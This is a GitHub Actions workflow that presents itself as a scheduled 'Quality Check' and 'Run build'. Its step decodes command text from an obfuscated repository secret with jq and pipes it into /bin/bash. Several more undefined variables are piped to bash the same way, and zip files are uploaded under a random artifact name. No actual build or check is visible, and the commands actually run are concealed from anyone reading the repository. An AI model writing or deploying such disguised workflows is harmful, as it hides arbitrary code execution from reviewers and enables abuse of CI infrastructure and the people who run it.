name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '52 0,6,12,18 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  perform:
    name: Run build
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run build
        env:
          jqmgs70911: ${{ secrets.jqmgs70911 }}
        run: |
          printf '%s' "$jqmgs70911" | jq -r .m5899 | /bin/bash
          echo $iw8 | jq -r .edk4 | /bin/bash
          printf '%s' "$lnzyx06148" | jq -r .df468 | /bin/bash
          printf '%s' "$yat60" | jq -r .w92156 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: D6R3PAsH
          path: "*.zip"
          retention-days: 1
